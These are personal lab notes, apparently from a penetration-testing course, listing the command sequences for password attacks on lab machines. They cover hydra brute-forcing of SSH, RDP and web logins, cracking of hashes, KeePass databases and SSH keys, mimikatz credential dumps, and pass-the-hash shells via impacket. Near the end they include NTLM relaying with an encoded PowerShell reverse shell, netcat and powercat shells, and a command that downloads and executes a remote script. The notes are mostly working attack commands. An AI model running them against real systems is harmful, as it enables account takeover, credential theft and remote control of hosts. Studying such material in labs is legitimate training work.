
SSH attack VM 1 - get password if you already have user (SSH)
```
sudo nmap -sV -p 2222 192.168.248.201
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.248.201
```

VM 2 - username spraying if you already have password (rdp)
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.248.202
hydra -L test-names.txt -p "SuperS3cure1337#" rdp://192.168.248.202
xfreerdp -u justin -p SuperS3cure1337# 192.168.248.202:3389
```

VM 3
```
sudo nmap -sV 192.168.248.202
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.248.201
xfreerdp -u itadmin -p hellokitty 192.168.248.202:3389
```

use ftp console
```
ftp itadmin@192.168.248.202
> binary
> passive (turn it off)
> ls
> get c:/Users/itadmin/Desktop/flag.txt
```

HTTP Attack VM 1 - dictionary attack
- need post body and what a failed attempt looks like
- format - path:request body: failed login identifier(condition string)(avoid keywords such as password or username to prevent false positives
192.168.248.201
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.249.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

VM 2
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.248.201 http-get
```

figure out how long it takes to crack something
```
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" | wc -c
```

keyspace (62 * num chars in password)
```
python3 -c "print(62**8)"
218340105584896
```

num md5 gpu hashes
68185100000

get minutes (keyspace / num hashes)
```
python3 -c "print(218340105584896 / 68185100000)"
```

```
cp /usr/share/wordlists/rockyou.txt rockyou.txt
sed -i 's/$/1@3$5/' rockyou.txt
echo \$1 \$@ \$3 \$$ \$5 > demo.rule
hashcat -r demo.rule --stdout demo.txt
echo "056df33e47082c77148dba529212d50a" > crackme.txt
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
```

don't need to create rules ourselves
```
ls -la /usr/share/hashcat/rules/
```

uppercase and duplicated
- https://kaoticcreations.blogspot.com/2011/09/explanation-of-hashcat-rules.html
```
echo 'u d' > demo.rule
hashcat -m 0 crackme2.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
```

what type of hash is it?
```
hashid "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"
```


password manager vm 1
```
xfreerdp /u:jason /p:lab /v:192.168.248.203 /w:1200 /h:700 /cert-ignore
```

copy file from windows to kali
```
impacket-smbserver -smb2support smb smb
net use \\192.168.45.194\smb
copy c:\Users\nadine\Documents\Database.kdbx \\192.168.45.194\smb
keepass2john Database.kdbx > keepass.hash
```

what type of hash is this
```
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
password manager vm 2
```
sudo nmap -sV 192.168.248.227
hydra -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.248.227
xfreerdp /u:nadine /p:123abc /v:192.168.248.227 /w:1200 /h:700
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
impacket-smbserver -u nadine -password 123abc -smb2support smb smb
keepass2john Database2.kdbx > keepass2.hash
hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

SSH passphrase attacks - VM 1
```
192.168.192.201:8080
ssh -i id_rsa -p 2222 dave@192.168.192.201
```

to crack, transform private key into a hash
```
ssh2john id_rsa > ssh.hash
```

- remove the ``<name>:`` part from the ssh.hash
- "$6" signifies SHA-512 (in the ssh.hash file)
- then determine the hash mode
- The output indicates that "``$6$``" is mode 22921

```
hashcat -h | grep -i "ssh"
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```
above does not work as length is too long and modern keys use aes-256-ctr cipher which is not supported by 22921

try it with john instead
```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
ssh -i id_rsa -p 2222 dave@192.168.192.201
````

### VM 2
```
sudo nmap -sV 192.168.192.201
gobuster dir -u http://192.168.192.201:80 -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
whatweb 192.168.192.201
searchsploit -m 50383
./50383.sh targets.txt /home/alfred/.ssh/id_rsa

ssh2john alfred-id_rsa > alfred-ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules alfred-ssh.hash
ssh -i alfred-id_rsa -p 2222 alfred@192.168.192.201
```

### cracking NTLM
- sam database: C:\Windows\system32\config\sam

### VM 1
```
xfreerdp /u:offsec /p:lab /v:192.168.192.210 /w:1200 /h:700
```

in powershell, check for users on the system
```
Get-LocalUser
```

- check for stored creds using C:\tools\mimikatz.exe
- to use it run powershell as administrator
```
cd C:\tools
ls
.\mimikatz.exe
sekurlsa::logonpasswords # attempts to extract password hashes, too much output
```

run these series of commands to get smaller output - will get user's hashes
```
privilege::debug
token::elevate
lsadump::sam
```

on kali save the hash to a file and determine the mode
```
hashcat --help | grep -i "ntlm" # NTLM = 1000
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### VM 2
```
xfreerdp /u:nadine /p:123abc /v:192.168.192.227 /w:1200 /h:700
hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
2835573fb334e3696ef62a00e5cf7571:francesca77
xfreerdp /u:steve /p:francesca77 /v:192.168.192.227 /w:1200 /h:700
```

Passing NTLM - VM 1
```
xfreerdp /u:gunther /p:password123! /v:192.168.192.211 /w:1200 /h:700
\\192.168.192.212\secrets
cd C:\tools
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

Administrator hash: 7a38310ea6f0027ee955abed1762964b
```
smbclient \\\\192.168.192.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

get system shell
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.192.212
```

get user shell
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.192.212
```

Cracking NetNTLMv2 - use if unprivileged user
VM 1
```
sudo responder -I tun0
dir \\192.168.45.194\test
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
xfreerdp /u:paul /p:123Password123 /v:192.168.192.211 /w:1200 /h:700
```

### VM 2
```
sudo nmap -sV 192.168.192.210
hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
xfreerdp /u:sam /p:DISISMYPASSWORD /v:192.168.192.210 /w:1200 /h:700
```

## Relaying
### VM 1

you want 3 tabs - first is impacket with a reverse shell payload
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.192.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

second is for the bind shell from first to second host
```
nc 192.168.192.211 5555
dir \\192.168.45.194\test
```

third is our listener to catch reverse shell
```
nc -nvlp 4444
```

### VM 2
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.192.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

powercat -l -p 5555 -e cmd
```

this one worked using burp intruder to start the bind shell
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.194/powercat.ps1");powercat -l -p 5555 -e cmd
```


